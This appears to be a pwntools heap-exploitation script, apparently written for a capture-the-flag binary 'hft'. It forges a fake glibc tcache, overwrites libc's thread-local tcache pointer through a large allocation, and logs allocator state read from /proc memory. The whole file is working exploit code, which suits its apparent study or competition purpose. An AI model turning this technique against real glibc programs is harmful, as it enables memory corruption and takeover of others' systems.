import os, sys, struct
from pwn import *
context.log_level = 'info'
context.arch = 'amd64'
HERE = './_z_441'
io = process(os.path.join(HERE, 'hft'), env={})

def rd(addr, n):
    with open('/proc/%d/mem' % io.pid, 'rb') as f:
        f.seek(addr)
        return f.read(n)

def maps(pat):
    for line in open('/proc/%d/maps' % io.pid):
        if pat in line:
            return int(line.split('-')[0], 16)
    return None

def alloc(size, data=b''):
    io.recvuntil(b"PKT_RES")
    io.send(p64(size))
    io.send(bytes(data) + b"\n")

def echo():
    io.recvuntil(b"PKT_DATA\x1b[m:[")
    buf = io.recvuntil(b"\x1b[1;34mPKT_INFO", drop=True)
    return buf[:-2]

ECHO6 = b"\x01" + b"\x00"*5
alloc(0x10, b"\x00"*8)
alloc(0x10, p64(0) + p64(0) + p64(0xd31))
alloc(0x1000, b"\x00"*8)
alloc(0x8, ECHO6)
leak = u64(echo()[:6].ljust(8, b"\x00"))
heap = maps('[heap]')
log.info("heap=%#x" % heap)

fake_tcache = heap + 0x22020
st = bytearray(0x290)
def sc(i, v): st[2*i] = v & 0xff; st[2*i+1] = (v >> 8) & 0xff
def se(i, v): st[0x80+8*i:0x88+8*i] = p64(v)
sc(0, 1); se(0, heap + 0x2e0)
sc(63, 1); se(63, fake_tcache - 0x10)
alloc(0x1000, bytes(st[8:0x290]))

libc_base = maps('441_libc.so.6')
tls_tcache_var = libc_base - 0x2908
log.info("libc=%#x tls tcachevar=%#x" % (libc_base, tls_tcache_var))

alloc(0x30001, b"A"*0x316e0 + p64(fake_tcache))
log.info("after mmap: tcachevar=%#x" % u64(rd(tls_tcache_var, 8)))
log.info("counts[0]=%#x entries0=%#x" % (u64(rd(fake_tcache, 8)) & 0xffff, u64(rd(fake_tcache+0x80, 8))))
log.info("main_arena.top = %#x" % u64(rd(libc_base + 0x219ce0 - 0x60, 8)))
log.info("unsorted fd=%#x bk=%#x" % (u64(rd(libc_base+0x219ce0, 8)), u64(rd(libc_base+0x219ce0+8, 8))))

alloc(0x10, ECHO6)
log.info("after alloc(0x10): counts[0]=%#x entries0=%#x" % (u64(rd(fake_tcache, 8)) & 0xffff, u64(rd(fake_tcache+0x80, 8))))
log.info("mem 0x2d0: " + rd(heap+0x2d0, 0x40).hex())
raw = echo()
log.info("echo raw=%s" % raw.hex())
io.close()
